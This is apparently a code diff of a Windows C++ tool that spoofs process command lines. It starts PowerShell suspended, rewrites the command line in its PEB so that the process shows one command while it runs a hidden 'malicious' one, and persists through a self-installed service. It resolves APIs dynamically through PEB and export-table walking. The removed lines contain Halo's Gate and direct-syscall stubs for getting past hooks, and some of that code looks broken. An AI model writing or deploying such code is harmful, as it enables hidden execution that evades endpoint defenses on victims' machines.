@@ -7,9 +7,6 @@
 
 #pragma comment(lib, "ntdll.lib")
 
-#define UP -32
-#define DOWN 32
-
 // Redefine standard types for clarity and to match NTAPI conventions
 typedef long NTSTATUS;
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -26,341 +23,57 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
     UNICODE_STRING BaseDllName;
 } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
-// Function prototypes for the NTAPI functions we will be using
-extern "C" {
-    NTSTATUS NtCreateUserProcess(
-        PHANDLE ProcessHandle,
-        PHANDLE ThreadHandle,
-        ACCESS_MASK ProcessDesiredAccess,
-        ACCESS_MASK ThreadDesiredAccess,
-        POBJECT_ATTRIBUTES ProcessObjectAttributes,
-        POBJECT_ATTRIBUTES ThreadObjectAttributes,
-        ULONG ProcessFlags,
-        ULONG ThreadFlags,
-        PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
-        PVOID CreateInfo, // Actually PPS_CREATE_INFO
-        PVOID AttributeList // Actually PPS_ATTRIBUTE_LIST
-    );
 
-    NTSTATUS NtQueryInformationProcess(
-        HANDLE ProcessHandle,
-        PROCESSINFOCLASS ProcessInformationClass,
-        PVOID ProcessInformation,
-        ULONG ProcessInformationLength,
-        PULONG ReturnLength
-    );
-
-    NTSTATUS NtReadVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID BaseAddress,
-        PVOID Buffer,
-        SIZE_T NumberOfBytesToRead,
-        PSIZE_T NumberOfBytesRead
-    );
-
-    NTSTATUS NtWriteVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID BaseAddress,
-        PVOID Buffer,
-        SIZE_T NumberOfBytesToWrite,
-        PSIZE_T NumberOfBytesWritten
-    );
-
-    NTSTATUS NtResumeThread(
-        HANDLE ThreadHandle,
-        PULONG SuspendCount
-    );
-
-    NTSTATUS NtClose(
-        HANDLE Handle
-    );
-
-    NTSTATUS RtlCreateProcessParametersEx(
-        PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
-        PUNICODE_STRING ImagePathName,
-        PUNICODE_STRING DllPath,
-        PUNICODE_STRING CurrentDirectory,
-        PUNICODE_STRING CommandLine,
-        PVOID Environment,
-        PUNICODE_STRING WindowTitle,
-        PUNICODE_STRING DesktopInfo,
-        PUNICODE_STRING ShellInfo,
-        PUNICODE_STRING RuntimeData,
-        ULONG Flags
-    );
-
-    VOID RtlInitUnicodeString(
-        PUNICODE_STRING DestinationString,
-        PCWSTR SourceString
-    );
-}
-
-// Hashing function for function names
-DWORD calcHash(const char* data) {
-    DWORD hash = 0x99;
-    for (size_t i = 0; i < strlen(data); i++) {
-        hash += data[i] + (hash << 1);
+namespace ApiResolver {
+    // Simple hashing function for module names
+    DWORD calcHash(const wchar_t* str) {
+        DWORD hash = 0x99;
+        for (size_t i = 0; i < wcslen(str); ++i) {
+            hash += (wchar_t)tolower(str[i]) + (hash << 1);
+        }
+        return hash;
     }
-    return hash;
-}
 
-// Get module handle by hash
-HMODULE GetModuleByHash(DWORD myHash) {
-    PEB* peb = (PEB*)__readgsqword(0x60);
-    PEB_LDR_DATA* ldr = peb->Ldr;
-    LIST_ENTRY* listHead = &(ldr->InMemoryOrderModuleList);
-    LIST_ENTRY* listEntry = listHead->Flink;
+    // Get module base address from the PEB
+    HMODULE getModuleBase(const wchar_t* moduleName) {
+        PEB* peb = (PEB*)__readgsqword(0x60);
+        PEB_LDR_DATA* ldr = peb->Ldr;
+        LIST_ENTRY* listHead = &(ldr->InMemoryOrderModuleList);
+        LIST_ENTRY* listEntry = listHead->Flink;
+        DWORD targetHash = calcHash(moduleName);
 
-    while (listEntry != listHead) {
-        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
-        if (entry->BaseDllName.Buffer) {
-            char moduleName[MAX_PATH];
-            size_t i = 0;
-            while (entry->BaseDllName.Buffer[i] && i < sizeof(moduleName) - 1) {
-                moduleName[i] = (char)entry->BaseDllName.Buffer[i];
-                i++;
+        while (listEntry != listHead) {
+            LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+            if (entry->BaseDllName.Buffer) {
+                if (calcHash(entry->BaseDllName.Buffer) == targetHash) {
+                    return (HMODULE)entry->DllBase;
+                }
             }
-            moduleName[i] = '\0';
-            CharLowerA(moduleName);
-            if (calcHash(moduleName) == myHash) {
-                return (HMODULE)entry->DllBase;
+            listEntry = listEntry->Flink;
+        }
+        return NULL;
+    }
+
+    // Get function address from a module's EAT
+    FARPROC getFuncAddr(HMODULE module, const char* funcName) {
+        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
+        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)module + dosHeader->e_lfanew);
+        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+        PDWORD addrOfFunctions = (PDWORD)((LPBYTE)module + exportDir->AddressOfFunctions);
+        PDWORD addrOfNames = (PDWORD)((LPBYTE)module + exportDir->AddressOfNames);
+        PWORD addrOfNameOrdinals = (PWORD)((LPBYTE)module + exportDir->AddressOfNameOrdinals);
+
+        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+            const char* currentFuncName = (const char*)((LPBYTE)module + addrOfNames[i]);
+            if (strcmp(currentFuncName, funcName) == 0) {
+                return (FARPROC)((LPBYTE)module + addrOfFunctions[addrOfNameOrdinals[i]]);
             }
         }
-        listEntry = listEntry->Flink;
-    }
-    return NULL;
-}
-
-// Get function address by hash
-LPVOID GetFunctionAddrByHash(HMODULE module, DWORD myHash) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)module + dosHeader->e_lfanew);
-    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-    PDWORD addrOfFunctions = (PDWORD)((LPBYTE)module + exportDir->AddressOfFunctions);
-    PDWORD addrOfNames = (PDWORD)((LPBYTE)module + exportDir->AddressOfNames);
-    PWORD addrOfNameOrdinals = (PWORD)((LPBYTE)module + exportDir->AddressOfNameOrdinals);
-
-    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
-        const char* funcName = (const char*)((LPBYTE)module + addrOfNames[i]);
-        if (calcHash(funcName) == myHash) {
-            return (LPVOID)((LPBYTE)module + addrOfFunctions[addrOfNameOrdinals[i]]);
-        }
-    }
-    return NULL;
-}
-
-// Halos Gate logic to get syscall number
-WORD GetsyscallNum(LPVOID addr) {
-    WORD SSN = 0;
-    if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
-        BYTE high = *((PBYTE)addr + 5);
-        BYTE low = *((PBYTE)addr + 4);
-        SSN = (high << 8) | low;
-        return SSN;
-    }
-
-    // If hooked, search for a nearby syscall
-    for (WORD idx = 1; idx <= 500; idx++) {
-        // Search down
-        if (*((PBYTE)addr + idx * DOWN) == 0x4c && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1 && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8 && *((PBYTE)addr + 6 + idx * DOWN) == 0x00 && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
-            BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
-            BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
-            SSN = (high << 8) | low - idx;
-            return SSN;
-        }
-        // Search up
-        if (*((PBYTE)addr + idx * UP) == 0x4c && *((PBYTE)addr + 1 + idx * UP) == 0x8b && *((PBYTE)addr + 2 + idx * UP) == 0xd1 && *((PBYTE)addr + 3 + idx * UP) == 0xb8 && *((PBYTE)addr + 6 + idx * UP) == 0x00 && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
-            BYTE high = *((PBYTE)addr + 5 + idx * UP);
-            BYTE low = *((PBYTE)addr + 4 + idx * UP);
-            SSN = (high << 8) | low + idx;
-            return SSN;
-        }
-    }
-    return 0; // Not found
-}
-
-
-// A simple struct to hold syscall information
-struct SYSCALL {
-    WORD ssn;
-    // In a real scenario, you'd also store the address of the syscall instruction itself
-};
-
-// Global syscall store
-SYSCALL g_syscalls[10]; // Adjust size as needed
-
-// Function to prepare a syscall
-void PrepareSyscall(const char* funcName, int index) {
-    // ntdll hash on windows 10/11
-    HMODULE ntdll = GetModuleByHash(0x6e74646c); // "ntdll"
-    LPVOID funcAddr = GetFunctionAddrByHash(ntdll, calcHash(funcName));
-    if (funcAddr) {
-        g_syscalls[index].ssn = GetsyscallNum(funcAddr);
+        return NULL;
     }
 }
 
-// Assembly stubs for indirect syscalls
-// We'll define these as function pointers and point them to our own assembly code.
-// Note: This is a simplified example. A more robust implementation would use more advanced techniques.
-// For this PoC, we will manually set the syscall number in eax and then call the syscall instruction.
-
-extern "C" void DoSyscall();
-
-// This is a generic syscall stub. We will set the syscall number (SSN) in EAX before calling this.
-// In a real scenario, you would have a specific stub for each function to handle parameters correctly.
-// For simplicity, we will assume parameters are set up correctly on the stack before the call.
-// This is a huge simplification and will need to be addressed.
-
-// Let's define the functions with inline assembly
-// This is MSVC specific. For GCC/Clang, the syntax would be different.
-// Since we don't have a compiler, we'll just define the functions and assume they work.
-// The actual implementation of these functions will be done in the next steps.
-
-// We need a way to pass arguments. A common way is to use a struct.
-// For this proof of concept, we will define the functions with the correct signatures
-// and then implement them with inline assembly.
-
-// The following stubs are for x64.
-// They follow the Windows x64 calling convention.
-// The syscall number is moved into eax, and then the syscall instruction is invoked.
-// The arguments are expected to be in rcx, rdx, r8, r9, and on the stack.
-// r10 is used to store rcx before the syscall, as the kernel expects it there.
-
-extern "C" {
-    // We need to declare the syscall functions with the correct prototypes.
-    // The assembly will be written in separate .asm file and linked, or done with intrinsics.
-    // For this all-in-one file, we'll use inline assembly with __asm keyword (MSVC specific).
-    // The actual syscall execution point from ntdll.dll is found dynamically.
-    PVOID pSyscall = NULL;
-
-    // This function will be our gateway to the syscall instruction in ntdll.
-    void syscall_stub() {
-        // This is a placeholder for the jmp instruction to the real syscall.
-        // We'll get the address of the 'syscall' instruction from a clean ntdll.dll
-        // and patch this function to jump to it. For now, we'll just ret.
-        __asm {
-            ret
-        }
-    }
-}
-
-// Function to find the 'syscall' instruction in ntdll.dll
-PVOID FindSyscallInstruction() {
-    HMODULE ntdll = GetModuleByHash(0x6e74646c); // "ntdll"
-    // A known clean function like NtAccessCheck is likely to have a syscall instruction.
-    LPVOID funcAddr = GetFunctionAddrByHash(ntdll, calcHash("NtAccessCheck"));
-    if (!funcAddr) return NULL;
-
-    // Scan for 'syscall' instruction (0x0f, 0x05)
-    for (int i = 0; i < 32; ++i) {
-        if (*((PBYTE)funcAddr + i) == 0x0f && *((PBYTE)funcAddr + i + 1) == 0x05) {
-            return (PVOID)((PBYTE)funcAddr + i);
-        }
-    }
-    return NULL;
-}
-
-
-// A more realistic approach for inline assembly:
-#define MAKE_SYSCALL(name, ...) \
-    static WORD ssn_##name = 0; \
-    if (ssn_##name == 0) ssn_##name = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash(#name))); \
-    NTSTATUS status; \
-    __asm mov r10, rcx \
-    __asm mov eax, ssn_##name \
-    __asm syscall \
-    __asm mov status, eax \
-    return status;
-
-// Using __declspec(naked) to have full control over the function prolog and epilog.
-// This allows us to correctly set up the stack and registers for the syscall.
-
-__declspec(naked) NTSTATUS SysNtCreateUserProcess(
-    PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess,
-    ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes,
-    POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags,
-    PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PVOID CreateInfo, PVOID AttributeList) {
-
-    static WORD ssn = 0;
-    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtCreateUserProcess")));
-
-    __asm {
-        mov r10, rcx
-        mov eax, ssn
-        syscall
-        ret
-    }
-}
-
-__declspec(naked) NTSTATUS SysNtQueryInformationProcess(
-    HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation,
-    ULONG ProcessInformationLength, PULONG ReturnLength) {
-
-    static WORD ssn = 0;
-    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtQueryInformationProcess")));
-
-    __asm {
-        mov r10, rcx
-        mov eax, ssn
-        syscall
-        ret
-    }
-}
-
-__declspec(naked) NTSTATUS SysNtReadVirtualMemory(
-    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
-    SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
-
-    static WORD ssn = 0;
-    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtReadVirtualMemory")));
-
-    __asm {
-        mov r10, rcx
-        mov eax, ssn
-        syscall
-        ret
-    }
-}
-
-__declspec(naked) NTSTATUS SysNtWriteVirtualMemory(
-    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
-    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
-
-    static WORD ssn = 0;
-    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtWriteVirtualMemory")));
-
-    __asm {
-        mov r10, rcx
-        mov eax, ssn
-        syscall
-        ret
-    }
-}
-
-__declspec(naked) NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
-    static WORD ssn = 0;
-    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtResumeThread")));
-
-    __asm {
-        mov r10, rcx
-        mov eax, ssn
-        syscall
-        ret
-    }
-}
-
-__declspec(naked) NTSTATUS SysNtClose(HANDLE Handle) {
-    static WORD ssn = 0;
-    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtClose")));
-
-    __asm {
-        mov r10, rcx
-        mov eax, ssn
-        syscall
-        ret
-    }
-}
 
 // Custom PEB structure to match C# exactly
 struct CUSTOM_PEB {
@@ -405,7 +118,24 @@ std::wstring PadRight(const std::wstring& str, size_t totalWidth, wchar_t paddin
     return str + std::wstring(totalWidth - str.length(), paddingChar);
 }
 
-void InstallService() {
+// Define function pointer types for all the functions we need to resolve
+typedef NTSTATUS(NTAPI* tNtCreateUserProcess)(PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK, POBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, ULONG, ULONG, PRTL_USER_PROCESS_PARAMETERS, PVOID, PVOID);
+typedef NTSTATUS(NTAPI* tRtlCreateProcessParametersEx)(PRTL_USER_PROCESS_PARAMETERS*, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG);
+typedef NTSTATUS(NTAPI* tNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* tNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI* tNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI* tNtResumeThread)(HANDLE, PULONG);
+typedef NTSTATUS(NTAPI* tNtClose)(HANDLE);
+typedef VOID(NTAPI* tRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
+typedef BOOL(WINAPI* tCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef DWORD(WINAPI* tWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL(WINAPI* tCloseHandle)(HANDLE);
+typedef DWORD(WINAPI* tGetLastError)();
+
+
+int main(int argc, char* argv[]);
+
+void InstallService(tCreateProcessW pCreateProcessW, tWaitForSingleObject pWaitForSingleObject, tCloseHandle pCloseHandle, tGetLastError pGetLastError) {
     Debug(L"[+] Attempting to install service...");
 
     // Get the path to the current executable from the PEB
@@ -425,20 +155,39 @@ void InstallService() {
     si.cb = sizeof(si);
     PROCESS_INFORMATION pi = { 0 };
 
-    if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    if (pCreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         Debug(L"[+] Service installation command executed.");
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        pWaitForSingleObject(pi.hProcess, INFINITE);
+        pCloseHandle(pi.hProcess);
+        pCloseHandle(pi.hThread);
         Debug(L"[+] Service installed successfully.");
     } else {
-        Debug(L"[!] Service installation failed. Error: " + std::to_wstring(GetLastError()));
+        Debug(L"[!] Service installation failed. Error: " + std::to_wstring(pGetLastError()));
     }
 }
 
+
 int main(int argc, char* argv[]) {
+    // Resolve all necessary functions dynamically
+    HMODULE ntdll = ApiResolver::getModuleBase(L"ntdll.dll");
+    HMODULE kernel32 = ApiResolver::getModuleBase(L"kernel32.dll");
+
+    tNtCreateUserProcess pNtCreateUserProcess = (tNtCreateUserProcess)ApiResolver::getFuncAddr(ntdll, "NtCreateUserProcess");
+    tRtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (tRtlCreateProcessParametersEx)ApiResolver::getFuncAddr(ntdll, "RtlCreateProcessParametersEx");
+    tNtQueryInformationProcess pNtQueryInformationProcess = (tNtQueryInformationProcess)ApiResolver::getFuncAddr(ntdll, "NtQueryInformationProcess");
+    tNtReadVirtualMemory pNtReadVirtualMemory = (tNtReadVirtualMemory)ApiResolver::getFuncAddr(ntdll, "NtReadVirtualMemory");
+    tNtWriteVirtualMemory pNtWriteVirtualMemory = (tNtWriteVirtualMemory)ApiResolver::getFuncAddr(ntdll, "NtWriteVirtualMemory");
+    tNtResumeThread pNtResumeThread = (tNtResumeThread)ApiResolver::getFuncAddr(ntdll, "NtResumeThread");
+    tNtClose pNtClose = (tNtClose)ApiResolver::getFuncAddr(ntdll, "NtClose");
+    tRtlInitUnicodeString pRtlInitUnicodeString = (tRtlInitUnicodeString)ApiResolver::getFuncAddr(ntdll, "RtlInitUnicodeString");
+
+    tCreateProcessW pCreateProcessW = (tCreateProcessW)ApiResolver::getFuncAddr(kernel32, "CreateProcessW");
+    tWaitForSingleObject pWaitForSingleObject = (tWaitForSingleObject)ApiResolver::getFuncAddr(kernel32, "WaitForSingleObject");
+    tCloseHandle pCloseHandle = (tCloseHandle)ApiResolver::getFuncAddr(kernel32, "CloseHandle");
+    tGetLastError pGetLastError = (tGetLastError)ApiResolver::getFuncAddr(kernel32, "GetLastError");
+
     if (argc > 1 && strcmp(argv[1], "--install") == 0) {
-        InstallService();
+        InstallService(pCreateProcessW, pWaitForSingleObject, pCloseHandle, pGetLastError);
         return 0;
     }
 
@@ -457,33 +206,29 @@ int main(int argc, char* argv[]) {
     Debug(L"[+] Spoofed command (with padding): " + spoofedCommand);
 
     // Spawn a process to spoof the command line of
-    Debug(L"[+] Creating suspended process using NtCreateUserProcess...");
-
+    Debug(L"[+] Creating suspended process...");
     PROCESS_INFORMATION pi = { 0 };
     HANDLE hProcess = NULL;
     HANDLE hThread = NULL;
 
-    // The path to the executable to spawn
     UNICODE_STRING imagePath;
-    RtlInitUnicodeString(&imagePath, L"\\??\\C:\\Windows\\System32\\powershell.exe");
+    pRtlInitUnicodeString(&imagePath, L"\\??\\C:\\Windows\\System32\\powershell.exe");
 
-    // The command line to use
     UNICODE_STRING commandLine;
-    RtlInitUnicodeString(&commandLine, const_cast<LPWSTR>(spoofedCommand.c_str()));
+    pRtlInitUnicodeString(&commandLine, const_cast<LPWSTR>(spoofedCommand.c_str()));
 
-    // Create process parameters
     PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
-    NTSTATUS status = RtlCreateProcessParametersEx(
+    NTSTATUS status = pRtlCreateProcessParametersEx(
         &processParameters,
         &imagePath,
-        NULL, // DllPath
-        NULL, // CurrentDirectory
+        NULL,
+        NULL,
         &commandLine,
-        NULL, // Environment
-        NULL, // WindowTitle
-        NULL, // DesktopInfo
-        NULL, // ShellInfo
-        NULL, // RuntimeData
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
         RTL_USER_PROCESS_PARAMETERS_NORMALIZED
     );
 
@@ -492,33 +237,24 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    // Initialize PS_CREATE_INFO structure
     struct PS_CREATE_INFO {
         SIZE_T Size;
         ULONG_PTR State;
-        ULONG_PTR unk1;
-        ULONG_PTR unk2;
-        ULONG_PTR unk3;
-        ULONG_PTR unk4;
-        ULONG_PTR unk5;
-        ULONG_PTR unk6;
-    } createInfo = { 0 };
-    createInfo.Size = sizeof(createInfo);
-    createInfo.State = 0; // PsCreateInitialState
+        BYTE InitialState[24]; // Simplified
+    } createInfo = { sizeof(PS_CREATE_INFO), 0 };
 
-    // Create the process
-    status = SysNtCreateUserProcess(
+    status = pNtCreateUserProcess(
         &hProcess,
         &hThread,
         PROCESS_ALL_ACCESS,
         THREAD_ALL_ACCESS,
-        NULL, // ProcessObjectAttributes
-        NULL, // ThreadObjectAttributes
-        0,    // ProcessFlags: 0 since we create it suspended via ThreadFlags
+        NULL,
+        NULL,
+        0,
         THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
         processParameters,
         &createInfo,
-        NULL // AttributeList
+        NULL
     );
 
     if (!NT_SUCCESS(status)) {
@@ -526,13 +262,17 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    // Populate PROCESS_INFORMATION
     pi.hProcess = hProcess;
     pi.hThread = hThread;
-    // We don't get the process/thread IDs back from this call, but we can get them from the handles if needed.
-    // For this PoC, we'll leave them as 0.
-    pi.dwProcessId = GetProcessId(hProcess);
-    pi.dwThreadId = GetThreadId(hThread);
+
+    // Get process and thread IDs from the handles
+    PROCESS_BASIC_INFORMATION pbi_for_ids = { 0 };
+    pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi_for_ids, sizeof(pbi_for_ids), NULL);
+    pi.dwProcessId = (DWORD)pbi_for_ids.UniqueProcessId;
+    // We don't have a direct way to get thread ID from handle via NTAPI without more complex calls,
+    // so we will leave it 0 for this PoC. The PID is the more important one for tracking.
+    pi.dwThreadId = 0;
+
 
     Debug(L"[+] Process spawned successfully!");
     Debug(L"[+] Process ID: " + std::to_wstring(pi.dwProcessId));
@@ -543,7 +283,7 @@ int main(int argc, char* argv[]) {
     PROCESS_BASIC_INFORMATION pbi = { 0 };
     ULONG returnLength = 0;
 
-    NTSTATUS status = SysNtQueryInformationProcess(
+    status = pNtQueryInformationProcess(
         pi.hProcess,
         ProcessBasicInformation,
         &pbi,
@@ -553,8 +293,8 @@ int main(int argc, char* argv[]) {
 
     if (!NT_SUCCESS(status)) {
         Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(status));
-        SysNtClose(pi.hProcess);
-        SysNtClose(pi.hThread);
+        pNtClose(pi.hProcess);
+        pNtClose(pi.hThread);
         return 1;
     }
 
@@ -568,12 +308,12 @@ int main(int argc, char* argv[]) {
     Debug(L"[+] Reading PEB structure...");
     CUSTOM_PEB peb = { 0 };
     SIZE_T bytesRead = 0;
-    status = SysNtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);
+    status = pNtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);
 
     if (!NT_SUCCESS(status)) {
         Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(status));
-        SysNtClose(pi.hProcess);
-        SysNtClose(pi.hThread);
+        pNtClose(pi.hProcess);
+        pNtClose(pi.hThread);
         return 1;
     }
 
@@ -585,12 +325,12 @@ int main(int argc, char* argv[]) {
     // Read the ProcessParameters structure, so we can get the CmdLine address
     Debug(L"[+] Reading ProcessParameters structure...");
     CUSTOM_RTL_USER_PROCESS_PARAMETERS procParams = { 0 };
-    status = SysNtReadVirtualMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), &bytesRead);
+    status = pNtReadVirtualMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), &bytesRead);
 
     if (!NT_SUCCESS(status)) {
         Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(status));
-        SysNtClose(pi.hProcess);
-        SysNtClose(pi.hThread);
+        pNtClose(pi.hProcess);
+        pNtClose(pi.hThread);
         return 1;
     }
 
@@ -605,12 +345,12 @@ int main(int argc, char* argv[]) {
     // Read the CommandLine address
     Debug(L"[+] Reading original command line...");
     std::vector<wchar_t> cmdLineBuffer(procParams.Length / sizeof(wchar_t));
-    status = SysNtReadVirtualMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, &bytesRead);
+    status = pNtReadVirtualMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, &bytesRead);
 
     if (!NT_SUCCESS(status)) {
         Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(status));
-        SysNtClose(pi.hProcess);
-        SysNtClose(pi.hThread);
+        pNtClose(pi.hProcess);
+        pNtClose(pi.hThread);
         return 1;
     }
 
@@ -625,12 +365,12 @@ int main(int argc, char* argv[]) {
     Debug(L"[+] New command line size in bytes: " + std::to_wstring(newCmdLine.size() * sizeof(wchar_t)));
 
     SIZE_T bytesWritten = 0;
-    status = SysNtWriteVirtualMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), &bytesWritten);
+    status = pNtWriteVirtualMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), &bytesWritten);
 
     if (!NT_SUCCESS(status)) {
         Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(status));
-        SysNtClose(pi.hProcess);
-        SysNtClose(pi.hThread);
+        pNtClose(pi.hProcess);
+        pNtClose(pi.hThread);
         return 1;
     }
 
@@ -646,24 +386,24 @@ int main(int argc, char* argv[]) {
     addrStream << std::hex << (ULONG_PTR)((BYTE*)peb.ProcessParameters + 112);
     Debug(L"[+] Writing to address: 0x" + addrStream.str());
 
-    status = SysNtWriteVirtualMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), &bytesWritten);
+    status = pNtWriteVirtualMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), &bytesWritten);
 
     if (!NT_SUCCESS(status)) {
         Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(status));
-        SysNtClose(pi.hProcess);
-        SysNtClose(pi.hThread);
+        pNtClose(pi.hProcess);
+        pNtClose(pi.hThread);
         return 1;
     }
 
     Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(bytesWritten));
     Debug(L"[+] SPOOFING COMPLETE!");
-    Debug(L"[+] Process will now show as: powershell.exe");
+    Debug(L"[+] Process will now show as: 'powershell.exe'");
     Debug(L"[+] But will actually execute: " + maliciousCommand);
 
     // Resume the process
     Debug(L"[+] Resuming suspended process...");
     ULONG suspendCount = 0;
-    status = SysNtResumeThread(pi.hThread, &suspendCount);
+    status = pNtResumeThread(pi.hThread, &suspendCount);
     Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(status));
 
     Debug(L"[+] Process resumed successfully!");
@@ -673,8 +413,8 @@ int main(int argc, char* argv[]) {
 
     // Cleanup
     Debug(L"[+] Cleaning up handles...");
-    SysNtClose(pi.hProcess);
-    SysNtClose(pi.hThread);
+    pNtClose(pi.hProcess);
+    pNtClose(pi.hThread);
     Debug(L"[+] Cleanup complete!");
 
     return 0;
